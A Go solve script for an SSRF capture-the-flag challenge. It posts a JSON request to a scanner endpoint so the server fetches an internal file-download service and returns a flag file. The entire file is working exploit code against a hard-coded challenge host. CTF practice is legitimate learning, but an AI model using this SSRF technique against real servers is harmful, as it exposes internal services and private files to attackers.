// =============================================================================
// 题目名称: Shiny Scanner
// 题目类别: Web - SSRF (服务端请求伪造)
// 解题思路: 扫描接口可请求内网地址，通过 SSRF 访问内网 5000 端口的文件下载
//
//	服务，读取 /home/system_admin/secret_flag.txt
//
// 用法: go run NovruzCTF_kecel-scanner.go [目标地址]
//
//	示例: go run NovruzCTF_kecel-scanner.go http://95.111.234.103:5050
//
// =============================================================================
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
)

const (
	defaultScannerURL = "http://95.111.234.103:5050"
	// 内网文件服务地址（通过 SSRF 访问）
	internalFileURL = "http://172.19.0.6:5000/download?file=/home/system_admin/secret_flag.txt"
)

// ScanRequest SSRF 请求结构体
type ScanRequest struct {
	URL     string            `json:"url"`
	Version string            `json:"version"`
	Headers map[string]string `json:"headers"`
}

func main() {
	base := defaultScannerURL
	if len(os.Args) > 1 {
		base = os.Args[1]
	}

	payload := ScanRequest{
		URL:     internalFileURL,
		Version: "1.1",
		Headers: map[string]string{},
	}
	buf, _ := json.Marshal(payload)
	resp, err := http.Post(base+"/api/mine", "application/json", bytes.NewBuffer(buf))
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] 请求失败: %v\n", err)
		os.Exit(1)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	fmt.Println(string(body))
}
